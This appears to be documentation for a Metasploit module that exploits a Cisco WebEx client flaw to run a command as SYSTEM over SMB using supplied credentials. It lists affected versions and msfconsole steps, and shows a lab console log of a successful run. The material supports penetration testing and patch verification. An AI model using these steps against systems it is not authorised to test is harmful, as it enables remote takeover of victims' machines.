## Description

  This module exploits a remote code execution vulnerability in Cisco's WebEx client software versions < v33.6.0.655
  By supplying valid login credentials to the target machine, a single command can be executed with System privileges.

## Vulnerable Application

  Cisco WebEx Client v33.3.8.7 and below

## Verification Steps

  Example steps in this format (is also in the PR):

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/admin/smb/webexec_command```
  4. Do: ```set RHOSTS <IP>```
  5. Do: ```set SMBUser <USERNAME>```
  6. Do: ```set SMBPass <PASSWORD>```
  7. Do: ```run```
  8. You should get output that verifies the execution of the command

## Options

  **FORCE_GUI**

  Uses WMIC to create a GUI

## Scenarios

### Tested on Cisco WebEx v33.3.8.7 on Windows 7 x64 and x86

  ```
  msf5 > use auxiliary/admin/smb/webexec_command 
  msf5 auxiliary(admin/smb/webexec_command) > set rhosts 192.168.37.136
  rhosts => 192.168.37.136
  msf5 auxiliary(admin/smb/webexec_command) > set smbuser a_user
  smbuser => a_user
  msf5 auxiliary(admin/smb/webexec_command) > set smbpass password
  smbpass => password
  msf5 auxiliary(admin/smb/webexec_command) > run

  [+] 192.168.37.136:445    - Command completed!
  [*] 192.168.37.136:445    - Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  msf5 auxiliary(admin/smb/webexec_command) > 
  ```
